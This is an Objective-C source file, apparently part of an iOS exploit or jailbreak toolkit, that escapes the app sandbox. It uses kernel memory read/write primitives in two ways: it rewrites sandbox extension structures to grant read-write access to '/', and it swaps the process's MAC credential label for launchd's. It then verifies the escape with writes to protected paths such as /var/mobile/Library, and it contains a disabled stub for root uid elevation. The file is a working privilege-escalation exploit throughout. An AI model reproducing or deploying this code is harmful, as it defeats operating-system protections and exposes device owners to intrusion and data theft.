/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * Uses the kexploit framework's dynamically-computed offsets (offsets.h/m)
 * which are specific to each iOS version + CPU family (17.0 through 26.x).
 *
 * Two approaches:
 *   1. ext_set patching — rewrite sandbox extension data to "/" + "read-write"
 *   2. MAC label swap — replace our cr_label with launchd's (no sandbox at all)
 *
 * The label swap is more reliable because it only needs to find launchd's label
 * and write one pointer, vs. ext_set requiring correct sandbox struct layout.
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <string.h>
#include "sandbox_escape.h"
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/kutils.h"
#include "kexploit/offsets.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);

#define KRW_LEN 0x20

// ext_set offset within the sandbox struct — stable across all iOS 17-26
#define OFF_SANDBOX_EXT_SET    0x10
#define OFF_EXT_DATA           0x40
#define OFF_EXT_DATALEN        0x48

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
    asm(".long 0xDAC143E0");
    asm("ret");
}
#else
#define __xpaci_sbx(x) (x)
#endif

#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

#pragma mark - Extension patching (single ext → path="/", class=read-write)

static int patch_ext_full(uint64_t ext) {
    if (!K(ext)) return -1;

    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }

    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);

    da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return -1;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, strlen(rw));
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);
    return 0;
}

static int patch_chain_full(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) {
            if (patch_ext_full(ext) == 0) n++;
            uint64_t da = early_kread64(ext + OFF_EXT_DATA);
            if (K(da)) {
                uint8_t hb[KRW_LEN];
                early_kread(hdr, hb, KRW_LEN);
                *(uint64_t*)(hb + 0x10) = da + 32;
                early_kwrite32bytes(hdr, hb);
            }
        }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

#pragma mark - Approach 1: ext_set patching using framework offsets

int sandbox_escape(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }

    // Use framework's proc_get_cred_label which uses dynamically-computed
    // offsets (off_proc_p_proc_ro, off_proc_ro_p_ucred, off_ucred_cr_label)
    // specific to the running iOS version + CPU family.
    uint64_t label = proc_get_cred_label(self_proc);
    if (!K(label)) {
        NSLog(@"[SBX] proc_get_cred_label failed (label=0x%llx)", label);
        return -1;
    }
    NSLog(@"[SBX] label=0x%llx (via framework offsets)", label);

    // Get sandbox from label using framework's label_get_sandbox
    uint64_t sandbox = label_get_sandbox(label);
    if (!K(sandbox)) {
        NSLog(@"[SBX] label_get_sandbox failed (sandbox=0x%llx)", sandbox);
        return -1;
    }
    NSLog(@"[SBX] sandbox=0x%llx (via framework offsets)", sandbox);

    // ext_set offset (0x10) is stable across all iOS 17-26
    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) {
        NSLog(@"[SBX] ext_set invalid at sandbox+0x%x", OFF_SANDBOX_EXT_SET);
        return -1;
    }
    NSLog(@"[SBX] ext_set=0x%llx", ext_set);

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain_full(hdr);
    }
    NSLog(@"[SBX] Patched %d extensions with path=/ class=read-write", patched);

    // Fill empty hash slots
    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = early_kread64(ext_set + s * 8);
            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
        }
        NSLog(@"[SBX] Filled %d empty hash slots with R+W extension", filled);
    }

    // Verify: try writing to sandbox-blocked paths
    {
        int fd_w = open("/var/mobile/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/Library/.sbx_rw_test"); }

        if (fd_w >= 0) {
            NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /var/mobile/Library/) ***");
            return 0;
        }

        fd_w = open("/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd_w >= 0) { close(fd_w); unlink("/Library/.sbx_rw_test"); }

        if (fd_w >= 0) {
            NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /Library/) ***");
            return 0;
        }

        NSLog(@"[SBX] ext_set write verification failed (errno=%d: %s)", errno, strerror(errno));
        NSLog(@"[SBX] %d extensions patched but sandbox still blocking writes", patched);
    }

    return -1;
}

#pragma mark - UID elevation (disabled)

int sandbox_elevate_to_root(uint64_t self_proc) {
    // DISABLED: Writing uid=0 to ucred's posix_cred has proven unreliable.
    // The sandbox_escape + apfs_own flow is sufficient without uid=0.
    NSLog(@"[SBX] elevate: SKIPPED (uid=0 write disabled for stability)");
    return -1;
}

#pragma mark - Approach 2: MAC label swap (more reliable)

int sandbox_label_swap(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[SBX-LBL] self_proc is NULL"); return -1; }

    // Step 1: Get our MAC label using framework offsets
    uint64_t our_label = proc_get_cred_label(self_proc);
    if (!K(our_label)) {
        NSLog(@"[SBX-LBL] proc_get_cred_label(self) failed (label=0x%llx)", our_label);
        return -1;
    }
    NSLog(@"[SBX-LBL] our_label=0x%llx (via framework offsets)", our_label);

    // Step 2: Find our ucred so we can write launchd's label into it.
    // proc_get_cred_label reads proc→proc_ro→ucred→cr_label, so we need to
    // re-derive ucred from proc_ro.
    uint64_t our_proc_ro = kread64(self_proc + off_proc_p_proc_ro);
    if (!K(our_proc_ro)) { NSLog(@"[SBX-LBL] our proc_ro invalid"); return -1; }
    uint64_t our_ucred = kread64(our_proc_ro + off_proc_ro_p_ucred);
    if (!K(our_ucred)) { NSLog(@"[SBX-LBL] our ucred invalid"); return -1; }
    NSLog(@"[SBX-LBL] our ucred=0x%llx", our_ucred);

    // Step 3: Find launchd
    uint64_t launchd = proc_find_by_name("launchd");
    if (!launchd || launchd == (uint64_t)-1) {
        launchd = proc_find(1);
        if (!launchd || launchd == (uint64_t)-1) {
            NSLog(@"[SBX-LBL] could not find launchd proc");
            return -1;
        }
    }
    NSLog(@"[SBX-LBL] launchd proc=0x%llx", launchd);

    // Step 4: Get launchd's MAC label using framework offsets
    uint64_t launchd_label = proc_get_cred_label(launchd);
    if (!K(launchd_label)) {
        NSLog(@"[SBX-LBL] proc_get_cred_label(launchd) failed (label=0x%llx)", launchd_label);
        return -1;
    }
    NSLog(@"[SBX-LBL] launchd_label=0x%llx (via framework offsets)", launchd_label);

    if (our_label == launchd_label) {
        NSLog(@"[SBX-LBL] labels already identical, no swap needed");
        return 0;
    }

    // Step 5: Swap — write launchd's label into our ucred's cr_label
    NSLog(@"[SBX-LBL] swapping cr_label: 0x%llx -> 0x%llx at ucred+0x%x",
          our_label, launchd_label, off_ucred_cr_label);
    kwrite64(our_ucred + off_ucred_cr_label, launchd_label);

    // Step 6: Verify
    uint64_t verify_label = kread_ptr(our_ucred + off_ucred_cr_label);
    if (verify_label != launchd_label) {
        NSLog(@"[SBX-LBL] swap verification FAILED (readback=0x%llx, expected=0x%llx)",
              verify_label, launchd_label);
        return -1;
    }
    NSLog(@"[SBX-LBL] swap verified: cr_label now 0x%llx (was 0x%llx)",
          verify_label, our_label);

    // Step 7: Functional verification
    int fd = open("/var/mobile/Library/.sbx_label_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        close(fd); unlink("/var/mobile/Library/.sbx_label_test");
        NSLog(@"[SBX-LBL] *** LABEL SWAP SUCCESSFUL - unrestricted filesystem access ***");
        return 0;
    }

    fd = open("/Library/.sbx_label_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) { close(fd); unlink("/Library/.sbx_label_test"); }

    if (fd >= 0) {
        NSLog(@"[SBX-LBL] *** LABEL SWAP SUCCESSFUL (write to /Library/ worked) ***");
        return 0;
    }

    NSLog(@"[SBX-LBL] label swapped OK but write still fails (errno=%d: %s)",
          errno, strerror(errno));
    NSLog(@"[SBX-LBL] This may mean cr_label write didn't take effect (ucred in PPL region?)");
    return -1;
}